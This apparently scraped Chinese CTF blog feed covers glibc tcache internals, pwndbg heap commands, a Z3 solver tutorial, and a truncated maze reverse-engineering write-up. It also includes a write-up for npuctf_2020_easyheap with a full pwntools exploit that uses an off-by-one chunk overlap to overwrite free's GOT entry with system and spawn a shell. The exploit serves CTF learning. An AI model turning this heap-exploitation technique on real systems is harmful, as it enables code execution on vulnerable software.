class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">//tcache单链表的链表头</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];      <span class="hljs-comment">//各个链表头构成的指针数组</span><br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);          <span class="hljs-comment">//单链表未满7</span><br>  e-&gt;next = tcache-&gt;entries[tc_idx];    <br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);         <span class="hljs-comment">//在范围内</span><br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);      <span class="hljs-comment">//对应大小的单链表不为空</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="pwndbg堆查看指令"><a href="#pwndbg堆查看指令" class="headerlink" title="pwndbg堆查看指令"></a>pwndbg堆查看指令</h2><h5 id="1-查看内存指令x："><a href="#1-查看内存指令x：" class="headerlink" title="1.查看内存指令x："></a>1.查看内存指令x：</h5><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，nfu代表三个参数</p><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面<br>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p><p>x &#x2F;10xd $rdi &#x2F;&#x2F;从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p><h5 id="2-堆操作指令（pwndbg插件独有）"><a href="#2-堆操作指令（pwndbg插件独有）" class="headerlink" title="2.堆操作指令（pwndbg插件独有）"></a>2.堆操作指令（pwndbg插件独有）</h5><p>arena &#x2F;&#x2F;显示arena的详细信息<br>arenas &#x2F;&#x2F;显示所有arena的基本信息<br>arenainfo &#x2F;&#x2F;好看的显示所有arena的信息<br>bins &#x2F;&#x2F;常用，查看所有种类的堆块的链表情况<br>fastbins &#x2F;&#x2F;单独查看fastbins的链表情况<br>largebins &#x2F;&#x2F;同上，单独查看largebins的链表情况<br>smallbins &#x2F;&#x2F;同上，单独查看smallbins的链表情况<br>unsortedbin &#x2F;&#x2F;同上，单独查看unsortedbin链表情况<br>tcachebins &#x2F;&#x2F;同上，单独查看tcachebins的链表情况<br>tcache &#x2F;&#x2F;查看tcache详细信息<br>heap &#x2F;&#x2F;数据结构的形式显示所有堆块，会显示一大堆<br>heapbase &#x2F;&#x2F;查看堆起始地址<br>heapinfo、heapinfoall &#x2F;&#x2F;显示堆得信息，和bins的挺像的，没bins好用<br><strong>parseheap &#x2F;&#x2F;显示堆结构，很好用（不包括堆区域外通过uaf申请的内存）</strong><br>tracemalloc &#x2F;&#x2F;好用，会跟提示所有操作堆的地方</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>npuctf_2020_easyheap</title>
    <link href="/2023/05/18/npuctf-2020-easyheap/"/>
    <url>/2023/05/18/npuctf-2020-easyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h1><p>考点：off_by_one</p><p>got表可写，没开pie，ubuntu版本1804，glibc2.27</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518153935.png" alt="QQ截图20230518153935"></p><p>经典菜单题</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518154423.png" alt="QQ截图20230518154423"></p><p>create函数，</p><p>1.存在bss段的内存来存放chunk的管理结构的指针，chunk的管理结构通过malloc(0x10)申请，分别存放用户申请的chunk的size和指针</p><p>2.限制了用户只能申请0x18和0x38的size，即用户申请的chunk算上chunk_header只能是0x20或0x40</p><p>3.最多申请10个chunk</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518164014.png" alt="QQ截图20230518164014"></p><p>edit()</p><p>存在off_by_one漏洞</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165404.png" alt="QQ截图20230518165404"></p><p>show()</p><p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165551.png" alt="QQ截图20230518165551"></p><p>delete()删除堆，不存在uaf，没问题</p><p>思路：got表可写，首先考虑修改free_got(其实atoi函数也可以)来getshell，只要能把管理员chunk中存放的指针修改成free_got，便能通过edit和show函数进行修改和泄露</p><p>由于edit能修改的个数取决于管理员chunk中存放的size，所以通过off_by_one修改下一个chunk的size位来溢出是不可行的。</p><p>经过尝试，发现可以利用fastbin，修改0x20的chunk为0x40，把被修改的chunk删了放到fastbin，再申请0x38的chunk，这时候0x20的管理员chunk被申请到了高地址的0x20，0x40的chunk被申请到了低地址的0x20，也就是说0x20的管理员chunk被包含在了0x40的用户chunk中</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>sleep(<span class="hljs-number">1</span>)<br>gdb.attach(io,<span class="hljs-string">&#x27;b menu&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))   <br>io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1  **chunk_overlap</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x200</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>free_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] free_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#3</span><br>delete(<span class="hljs-number">3</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastbin_attack</tag>
      
      <tag>heap</tag>
      
      <tag>glibc2.27</tag>
      
      <tag>off_by_one</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_z3</title>
    <link href="/2022/09/11/python-z3/"/>
    <url>/2022/09/11/python-z3/</url>
    
    <content type="html"><![CDATA[<h1 id="python-z3"><a href="#python-z3" class="headerlink" title="python z3"></a>python z3</h1><p>Z3是由Microsoft Research开发的高性能定理证明器。(可以理解为自动解方程组的感觉)。Z3 在工业应用中实际上常见于软件验证、程序分析等。</p><p>由于Z3功能实在强大，也被用于很多其他领域：软件&#x2F;硬件验证和测试，约束解决，混合系统分析，安全性，生物学（计算机模拟分析）和几何问题。</p><p>CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。</p><p>api文档：<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p><a href="https://z3prover.github.io/api/html/namespacez3py.html">https://z3prover.github.io/api/html/namespacez3py.html</a></p><p>相关教程：<a href="https://www.cnblogs.com/hetianlab/p/13685260.html">https://www.cnblogs.com/hetianlab/p/13685260.html</a></p><p><a href="https://www.codeleading.com/article/50864767427/">https://www.codeleading.com/article/50864767427/</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install z3<br><br>pip install z3_solver<br><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>* <span class="hljs-comment">#引入库</span><br></code></pre></td></tr></table></figure><h3 id="声明变量（未知数）"><a href="#声明变量（未知数）" class="headerlink" title="声明变量（未知数）"></a>声明变量（未知数）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)    <span class="hljs-comment">#声明整数</span><br>x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)   <span class="hljs-comment">#声明实数 </span><br>x = Bool(<span class="hljs-string">&#x27;x&#x27;</span>)   <span class="hljs-comment">#声明布尔类型</span><br>x = Bitvec(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-number">8</span>)  <span class="hljs-comment">#声明一个8位的位向量 位向量，用于求解与/或/移位等位运算</span><br>x,y=Ints(<span class="hljs-string">&#x27;x y&#x27;</span>)   <span class="hljs-comment">#批量声明整数未知数,Real和Bool相同</span><br>x,y=Bitsvecs(<span class="hljs-string">&#x27;x y&#x27;</span>,<span class="hljs-number">8</span>)   <span class="hljs-comment">#批量声明位向量</span><br><br>A=Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>B=ToReal(A)<span class="hljs-comment">#整型转换成实数</span><br></code></pre></td></tr></table></figure><h3 id="增加方程约束和求解"><a href="#增加方程约束和求解" class="headerlink" title="增加方程约束和求解"></a>增加方程约束和求解</h3><p>**断言(assertion)**是一种在程序中的一阶逻辑(如：一个结果为真或假的逻辑判断式)，目的为了表示与验证软件开发者预期的结果——当程序执行到断言的位置时，对应的断言应该为真。若断言不为真时，程序会中止执行，并给出错误信息。</p><p>这里最好知道断言的概念，z3的求解器以assert为参数,判断有无解，有解则求出当参数中的assert都满足时的解</p><h5 id="solve-和求解器Solver"><a href="#solve-和求解器Solver" class="headerlink" title="solve()和求解器Solver()"></a>solve()和求解器Solver()</h5><p><strong>solve()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>A, B =Ints(<span class="hljs-string">&quot;a b&quot;</span>)<br>assert1 = <span class="hljs-number">2</span> * A + B == <span class="hljs-number">7</span><br>assert2 = A + B == <span class="hljs-number">5</span><br>solve(assert1, assert2)  <span class="hljs-comment">## 直接打印符合约束条件的未知量的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">以下是输出</span><br><span class="hljs-string">[b = 3, a = 2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Solver()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>A, B = Ints(<span class="hljs-string">&quot;a b&quot;</span>)<br>s = Solver()     <span class="hljs-comment">#以s为载体创建求解器</span><br>assert1 = <span class="hljs-number">2</span> * A + B == <span class="hljs-number">7</span><br>assert2 = A + B == <span class="hljs-number">5</span><br>s.add(assert1, assert2)<span class="hljs-comment">#加入限制条件</span><br><span class="hljs-built_in">print</span>(s.check()) <span class="hljs-comment"># 返回sat代表有解，unsat代表无解</span><br><span class="hljs-built_in">print</span>(s.model()) <span class="hljs-comment"># 返回符合约束条件的未知量的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">以下是输出</span><br><span class="hljs-string">sat  </span><br><span class="hljs-string">[b = 3, a = 2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h5 id><a href="#" class="headerlink" title></a></h5><h5 id="遍历Solver-中的断言"><a href="#遍历Solver-中的断言" class="headerlink" title="遍历Solver()中的断言"></a>遍历Solver()中的断言</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">A = Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>B = Int(<span class="hljs-string">&#x27;b&#x27;</span>)<br>s = Solver()<br>s.add(a == <span class="hljs-number">1</span>,b == <span class="hljs-number">2</span>,a+b == <span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> C <span class="hljs-keyword">in</span> s.assertions():<br>    <span class="hljs-built_in">print</span>(C)<br></code></pre></td></tr></table></figure><h3 id="sort-返回表达式的结果类型"><a href="#sort-返回表达式的结果类型" class="headerlink" title=".sort() 返回表达式的结果类型"></a>.sort() 返回表达式的结果类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Real(<span class="hljs-string">&#x27;y&#x27;</span>)<br>t1 = (x + <span class="hljs-number">1</span>).sort()<br>t2 = (y + <span class="hljs-number">1</span>).sort()<br>t3 = (x &gt;= <span class="hljs-number">2</span>).sort()<br><span class="hljs-built_in">print</span>(t1,t2,t3)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输出:</span><br><span class="hljs-string">Int Real Bool</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Real实数的精度设置"><a href="#Real实数的精度设置" class="headerlink" title="Real实数的精度设置"></a>Real实数的精度设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br>set_option(rational_to_decimal=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 启用精度</span><br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br>set_option(precision=<span class="hljs-number">30</span>)   <span class="hljs-comment"># 设置精度</span><br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输出：</span><br><span class="hljs-string">[x = 1/3]</span><br><span class="hljs-string">[x = 0.3333333333?]</span><br><span class="hljs-string">[x = 0.333333333333333333333333333333?]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="检查模型"><a href="#检查模型" class="headerlink" title="检查模型"></a>检查模型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">x, y, z = Reals(<span class="hljs-string">&#x27;x y z&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, x + y &gt; <span class="hljs-number">3</span>, z - x &lt; <span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(s.check()) <br><br>m = s.model()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = %s&quot;</span> % m[x]) <br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;traversing model...&quot;</span>) <br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s = %s&quot;</span> % (d.name(), m[d])) <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF新生赛2020_Oruga</title>
    <link href="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/"/>
    <url>/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/</url>
    
    <content type="html"><![CDATA[<p>知识点：迷宫题</p><p>题目显式或隐式地给出一个迷宫，定义在迷宫中移动对应的符号，通过走迷宫的形式得到flag</p><p>难点：</p><p>1.意识到这是一道迷宫题，考验代码分析能力和经验。</p><p>2.分析迷宫的类型，将迷宫还原，需要抽象思维。</p><p>3.分析在迷宫中的动作的执行规则</p><p>题目主函数</p><p><img src="/2022/09/09/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga/1.png" alt="1"></p><p>首先检测了flag格式，不对则输出”Format false!“格式错误</p><p>然后查看sub_78A函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">sub_78A</span><span class="hljs-params">(__int64 input_addr)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] 